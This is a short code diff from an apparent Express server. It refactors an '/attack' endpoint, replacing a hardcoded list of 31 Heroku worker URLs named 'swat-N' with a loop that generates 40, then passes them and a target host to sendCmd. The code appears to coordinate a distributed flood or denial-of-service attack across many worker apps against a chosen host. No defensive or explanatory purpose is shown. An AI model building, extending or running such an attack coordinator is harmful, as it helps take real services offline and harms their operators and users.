@@ -30,40 +30,12 @@ app.post('/attack',function (req,res ) {
   res.end('done');
   run = true;
 
-  sendCmd([
-  'https://swat-1.herokuapp.com/',
-  'https://swat-2.herokuapp.com/',
-  'https://swat-3.herokuapp.com/',
-  'https://swat-4.herokuapp.com/',
-  'https://swat-5.herokuapp.com/',
-  'https://swat-6.herokuapp.com/',
-  'https://swat-7.herokuapp.com/',
-  'https://swat-8.herokuapp.com/',
-  'https://swat-9.herokuapp.com/',
-  'https://swat-10.herokuapp.com/',
-  'https://swat-11.herokuapp.com/',
-  'https://swat-12.herokuapp.com/',
-  'https://swat-13.herokuapp.com/',
-  'https://swat-14.herokuapp.com/',
-  'https://swat-15.herokuapp.com/',
-  'https://swat-16.herokuapp.com/',
-  'https://swat-17.herokuapp.com/',
-  'https://swat-18.herokuapp.com/',
-  'https://swat-19.herokuapp.com/',
-  'https://swat-20.herokuapp.com/',
-  'https://swat-21.herokuapp.com/',
-  'https://swat-22.herokuapp.com/',
-  'https://swat-23.herokuapp.com/',
-  'https://swat-24.herokuapp.com/',
-  'https://swat-25.herokuapp.com/',
-  'https://swat-26.herokuapp.com/',
-  'https://swat-27.herokuapp.com/',
-  'https://swat-28.herokuapp.com/',
-  'https://swat-29.herokuapp.com/',
-  'https://swat-30.herokuapp.com/',
-  'https://swat-31.herokuapp.com/',
-
-],host);
+var list = [];
+for (var i = 1; i<41; i++)
+{
+  list.push('https://swat-'+ i +'.herokuapp.com/');
+}
+  sendCmd(list,host);
 
 
 });
